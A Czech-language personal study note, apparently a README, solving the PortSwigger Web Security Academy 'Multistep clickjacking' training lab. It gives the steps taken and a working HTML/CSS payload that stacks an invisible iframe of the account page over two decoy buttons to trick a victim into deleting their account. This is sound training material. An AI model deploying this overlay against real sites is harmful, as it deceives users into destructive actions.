# PortSwigger Lab: Multistep clickjacking

## 📚 Studijní materiál
Tento repozitář slouží jako můj osobní studijní zápisník a přehled řešení laboratoří z platformy PortSwigger Web Security Academy.

---

## 📌 Popis zranitelnosti a řešení

Cílem této laboratoře bylo provést **vícestupňový útok typu Clickjacking (Multistep clickjacking)**, kde akce vyžadovala kliknutí na více tlačítek za sebou (například inicializaci akce a její následné potvrzení).

### 🛠️ Postup řešení

1. Na stránce laboratoře jsem zkopíroval hlavní URL adresu a vložil ji do atributu `src` v tagu `iframe` s cestou `/my-account`.
2. Na **Go to exploit server** jsem vložil počáteční exploit kód obsahující dvě interaktivní pozice (`.firstClick` a `.secondClick`) s částečnou průhledností (`opacity: 0.1`), abych viděl jejich pozici.
3. Kliknul jsem na **Store** a následně na **View exploit** pro vizuální kontrolu rozvržení.
4. V záložce s hlavní aplikací jsem se přihlásil pod testovacím účtem (`wiener:peter`), abych přesně viděl umístění tlačítek pro smazání účtu a následné potvrzení.
5. Vrátil jsem se na exploit server, doladil souřadnice (`top` a `left`) pro `.secondClick` na hodnoty `295px` a `225px`, aby nápisy na pixel přesně lícovaly s tlačítky pod neviditelným `iframe`.
6. Nastavil jsem finální neviditelnost pomocí `opacity: 0.00001`, znovu kliknul na **Store**.
7. Nakonec jsem kliknul na tlačítko **Deliver exploit to victim**, čímž byl exploit úspěšně doručen oběti a laboratoř se vyřešila.

### 📄 Finální kód exploitu

```html
<style>
	iframe {
		position: relative;
		width: 500px;
		height: 700px;
		opacity: 0.00001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position: absolute;
		top: 500px;
		left: 50px;
		z-index: 1;
	}
   .secondClick {
		top: 295px;
		left: 225px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account](https://YOUR-LAB-ID.web-security-academy.net/my-account)"></iframe>


💡 Technické vysvětlení proč to fungovalo?

Co je Multistep clickjacking? Některé citlivé akce na webech (jako je smazání účtu nebo změna hesla) neprovedou změnu hned po jednom kliknutí, ale vyžadují potvrzení (např. tlačítko „Smazat“ a následně vyskakovací „Potvrdit“). Útočník proto musí vytvořit past, která oběť přinutí provést sérii kliknutí za sebou na správná místa

Proč se upravovaly souřadnice (čísla)? Pomocí CSS vlastností top a left (.firstClick a .secondClick) jsem musel každé jednotlivé lákavé tlačítko na naší podvržené stránce umístit na jiné místo. Hodnoty (top: 295px; left: 225px) byly upraveny tak, aby první kliknutí aktivovalo tlačítko v rozhraní účtu a druhé navazující kliknutí přesně trefilo potvrzovací dialogové tlačítko na skryté stránce.

Význam opacity: 0.00001: Nastavením extrémně nízké průhlednosti se nebezpečný iframe stal pro uživatele zcela neviditelným, ale technicky zůstal plně interaktivní a připravený zachytit fyzická kliknutí oběti na připravená místa.